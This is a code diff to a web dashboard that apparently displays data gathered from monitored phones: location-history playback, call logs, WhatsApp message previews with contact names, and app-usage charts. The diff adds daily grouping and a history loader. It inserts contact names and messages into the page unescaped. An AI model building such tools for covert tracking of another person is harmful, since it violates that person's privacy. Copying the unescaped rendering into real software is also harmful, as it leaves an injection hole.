@@ -59,6 +59,15 @@ td{padding:6px 4px;border-bottom:1px solid var(--border)}
 .voice-card .vname{font-size:13px;font-weight:500;color:var(--text)}
 .voice-card .vmeta{font-size:11px;color:var(--muted);margin-top:2px}
 .voice-card audio{width:100%;margin-top:6px}
+.tl-group{margin-bottom:12px}
+.tl-day{font-size:12px;color:var(--accent);font-weight:600;padding:4px 0 6px;border-bottom:1px solid var(--border);margin-bottom:6px}
+.tl-summary{font-size:11px;color:var(--muted);margin-bottom:6px;display:flex;gap:12px;flex-wrap:wrap}
+.app-daily{display:flex;gap:8px;align-items:flex-end;margin-bottom:12px;overflow-x:auto;padding-bottom:4px}
+.app-daily-bar{display:flex;flex-direction:column;align-items:center;min-width:40px;gap:2px}
+.app-daily-bar .bar{width:24px;border-radius:3px 3px 0 0;min-height:4px}
+.app-daily-bar .label{font-size:9px;color:var(--muted);text-align:center}
+.app-period-btn{padding:3px 10px;font-size:11px;border:1px solid var(--border);background:var(--bg);color:var(--muted);border-radius:10px;cursor:pointer}
+.app-period-btn.active{background:var(--accent);color:#000;border-color:var(--accent)}
 .alert-banner{padding:8px 12px;font-size:12px;display:none}
 .alert-banner.show{display:block}
 .alert-banner.warn{background:rgba(255,202,40,.15);color:var(--accent);border-bottom:1px solid rgba(255,202,40,.3)}
@@ -120,7 +129,11 @@ body{display:grid;grid-template-columns:380px 1fr;grid-template-rows:auto 1fr;he
 <div id="timelineList"></div>
 </div>
 <div id="tab-calls"><table><thead><tr><th>Time</th><th>Number</th><th>Duration</th><th>Type</th></tr></thead><tbody id="callsBody"></tbody></table></div>
-<div id="tab-apps"><div id="appsChart"></div></div>
+<div id="tab-apps"><div class="app-period" style="display:flex;gap:6px;margin-bottom:8px;flex-wrap:wrap">
+<span class="app-period-btn active" data-period="today">Today</span>
+<span class="app-period-btn" data-period="yesterday">Yesterday</span>
+<span class="app-period-btn" data-period="week">7-day avg</span>
+</div><div id="appsChart"></div></div>
 <div id="tab-geofence"><div id="geofenceList"></div></div>
 <div id="tab-voice"><div id="voiceNotesList"><div class="label">No voice notes yet</div></div></div>
 </div>
@@ -136,6 +149,7 @@ body{display:grid;grid-template-columns:380px 1fr;grid-template-rows:auto 1fr;he
 <input type="range" id="playScrubber" min="0" max="100" value="0">
 <span class="ts" id="playTs">--</span>
 <span class="ts" id="playCount">0/0</span>
+<button id="loadHistoryBtn" style="font-size:10px;padding:2px 6px;background:var(--border);color:var(--text);border:none;border-radius:3px;cursor:pointer" title="Load older location history">&#x1F4C5; History</button>
 </div>
 </div>
 <div class="lightbox" id="lightbox"><img id="lightboxImg" alt=""></div>
@@ -576,15 +590,45 @@ async function pollApps() {
   }
   const sorted = Object.values(rtdbData).map(v => ({
     name: v.appName || v.packageName || '?',
-    ms: parseInt(v.totalForegroundMs || '0')
+    ms: parseInt(v.totalForegroundMs || '0'),
+    dailyMs: v.dailyMs || null
   })).sort((a, b) => b.ms - a.ms).slice(0, 15);
   const maxMs = sorted.length ? sorted[0].ms : 1;
-  chart.innerHTML = sorted.map(a => `
-    <div class="bar-row">
-      <span class="bar-label">${a.name}</span>
-      <div class="bar-fill" style="width:${(a.ms/maxMs*100).toFixed(0)}%"></div>
-      <span class="bar-val">${(a.ms/60000).toFixed(1)}m</span>
-    </div>`).join('');
+  // Build daily comparison bars
+  const period = document.querySelector('.app-period-btn.active')?.dataset?.period || 'today';
+  let html = '';
+  if (period === 'today') {
+    html = sorted.map(a => `
+      <div class="bar-row">
+        <span class="bar-label">${a.name}</span>
+        <div class="bar-fill" style="width:${(a.ms/maxMs*100).toFixed(0)}%"></div>
+        <span class="bar-val">${(a.ms/60000).toFixed(1)}m</span>
+      </div>`).join('');
+  } else if (period === 'yesterday' && sorted[0]?.dailyMs) {
+    const yMax = Math.max(...sorted.map(a => a.dailyMs?.yesterday || 0), 1);
+    html = sorted.map(a => `
+      <div class="bar-row">
+        <span class="bar-label">${a.name}</span>
+        <div class="bar-fill" style="width:${((a.dailyMs?.yesterday||0)/yMax*100).toFixed(0)}%"></div>
+        <span class="bar-val">${((a.dailyMs?.yesterday||0)/60000).toFixed(1)}m</span>
+      </div>`).join('');
+  } else if (period === 'week' && sorted[0]?.dailyMs) {
+    const wMax = Math.max(...sorted.map(a => a.dailyMs?.weekAvg || 0), 1);
+    html = sorted.map(a => `
+      <div class="bar-row">
+        <span class="bar-label">${a.name}</span>
+        <div class="bar-fill" style="width:${((a.dailyMs?.weekAvg||0)/wMax*100).toFixed(0)}%"></div>
+        <span class="bar-val">${((a.dailyMs?.weekAvg||0)/60000).toFixed(1)}m</span>
+      </div>`).join('');
+  } else {
+    html = sorted.map(a => `
+      <div class="bar-row">
+        <span class="bar-label">${a.name}</span>
+        <div class="bar-fill" style="width:${(a.ms/maxMs*100).toFixed(0)}%"></div>
+        <span class="bar-val">${(a.ms/60000).toFixed(1)}m</span>
+      </div>`).join('');
+  }
+  chart.innerHTML = html || '<div class="label">No app usage data for this period</div>';
 }
 
 async function pollHistory() {
@@ -713,6 +757,27 @@ document.getElementById('playScrubber').addEventListener('input', function() {
   document.getElementById('playCount').textContent = `${playbackIdx + 1}/${playbackPoints.length}`;
 });
 
+// --- Load History ---
+document.getElementById('loadHistoryBtn').addEventListener('click', async function() {
+  if (!selectedDevice) return;
+  this.textContent = 'Loading...';
+  try {
+    const hist = await fetchRTDB(`devices/${selectedDevice}/location/history`);
+    if (!hist || typeof hist !== 'object') { showAlert('No historical data', 'warn'); this.textContent = '\u{1F4C5} History'; return; }
+    const pts = Object.entries(hist)
+      .map(([k, v]) => ({ ts: parseInt(k), lat: parseFloat(v.lat), lng: parseFloat(v.lng) }))
+      .filter(p => p.lat && p.lng)
+      .sort((a, b) => a.ts - b.ts)
+      .map(p => [p.lat, p.lng]);
+    if (!pts.length) { showAlert('No valid history points', 'warn'); this.textContent = '\u{1F4C5} History'; return; }
+    locationHistory = pts;
+    updateTrail();
+    if (pts.length) map.fitBounds(pts);
+    showAlert(`Loaded ${pts.length} historical points`, 'warn');
+  } catch {}
+  this.textContent = '\u{1F4C5} History';
+});
+
 // --- Timeline ---
 let timelineFilter = 'all';
 document.querySelectorAll('.chip[data-filter]').forEach(chip => {
@@ -732,25 +797,55 @@ function renderTimeline(docs) {
     if (timelineFilter === 'call') return type.includes('call');
     if (timelineFilter === 'whatsapp') return type.includes('whatsapp') || type.includes('message');
     return true;
-  }).slice(0, 50);
-  list.innerHTML = filtered.map(d => {
-    const type = d.type || '';
-    const ts = parseInt(d.ts_ms || '0');
-    const icon = type.includes('whatsapp') ? '\u{1F4AC}' : type.includes('call') ? '\u{1F4DE}' : '\u{1F4CD}';
-    const contact = d.contactName || d.contact || '';
-    const msg = d.messagePreview || '';
-    const dur = d.duration || '';
-    const dir = d.direction || '';
-    return `<div class="card">
-      <div class="time">${icon} ${pkt(ts)}</div>
-      <div>${contact}${msg ? ': ' + msg : ''}${dur ? ' \u2022 ' + dur + 's' : ''}${dir ? ' ['+dir+']' : ''}</div>
-    </div>`;
-  }).join('') || '<div class="label">No entries</div>';
+  }).slice(0, 100);
+  if (!filtered.length) { list.innerHTML = '<div class="label">No entries</div>'; return; }
+  // Deduplicate consecutive same-type from same contact within 60s
+  const deduped = [];
+  for (const d of filtered) {
+    const last = deduped[deduped.length - 1];
+    if (last && (d.type || '').includes(last.type || '') &&
+        (d.contactName || d.contact || '') === (last.contactName || last.contact || '') &&
+        Math.abs(parseInt(d.ts_ms || '0') - parseInt(last.ts_ms || '0')) < 60000) {
+      continue;
+    }
+    deduped.push(d);
+  }
+  // Group by day
+  const groups = {};
+  for (const d of deduped) {
+    const day = new Date(parseInt(d.ts_ms || '0')).toLocaleDateString('en-PK', { timeZone: PKT, day: '2-digit', month: 'short', weekday: 'short' });
+    if (!groups[day]) groups[day] = [];
+    groups[day].push(d);
+  }
+  // Daily summary
+  let html = '';
+  for (const [day, entries] of Object.entries(groups)) {
+    const locs = entries.filter(e => (e.type || '').toLowerCase() === 'location').length;
+    const calls = entries.filter(e => (e.type || '').includes('call')).length;
+    const msgs = entries.filter(e => (e.type || '').includes('whatsapp') || (e.type || '').includes('message')).length;
+    const summary = [locs ? `${locs}📍` : '', calls ? `${calls}📞` : '', msgs ? `${msgs}💬` : ''].filter(Boolean).join(' ');
+    html += `<div class="tl-group"><div class="tl-day">${day}</div><div class="tl-summary">${summary}</div>`;
+    for (const d of entries) {
+      const type = d.type || '';
+      const ts = parseInt(d.ts_ms || '0');
+      const icon = type.includes('whatsapp') ? '\u{1F4AC}' : type.includes('call') ? '\u{1F4DE}' : '\u{1F4CD}';
+      const contact = d.contactName || d.contact || '';
+      const msg = d.messagePreview || '';
+      const dur = d.duration || '';
+      const dir = d.direction || '';
+      html += `<div class="card">
+        <div class="time">${icon} ${pkt(ts)}</div>
+        <div>${contact}${msg ? ': ' + msg : ''}${dur ? ' \u2022 ' + dur + 's' : ''}${dir ? ' ['+dir+']' : ''}</div>
+      </div>`;
+    }
+    html += '</div>';
+  }
+  list.innerHTML = html;
 }
 
 function renderCalls(docs) {
   const body = document.getElementById('callsBody');
-  const calls = docs.filter(d => (d.type || '').includes('call')).slice(0, 50);
+  const calls = docs.filter(d => (d.type || '').includes('call')).slice(0, 100);
   body.innerHTML = calls.map(d => {
     const ts = parseInt(d.ts_ms || '0');
     const name = d.contactName || d.contact || '';
@@ -762,6 +857,15 @@ function renderCalls(docs) {
     return `<tr><td>${pktShort(ts)}</td><td>${numDisplay}</td><td>${dur}s</td><td>${dir}${loc ? '<br><span style="font-size:11px;color:var(--muted)">\u{1F4CD} ' + loc + '</span>' : ''}</td></tr>`;
   }).join('') || '<tr><td colspan="4" style="color:var(--muted)">No calls</td></tr>';
 }
+
+// --- App period selector ---
+document.querySelectorAll('.app-period-btn').forEach(btn => {
+  btn.addEventListener('click', () => {
+    document.querySelectorAll('.app-period-btn').forEach(b => b.classList.remove('active'));
+    btn.classList.add('active');
+    pollApps();
+  });
+});
 
 // --- Copy coords ---
 document.addEventListener('keydown', e => {
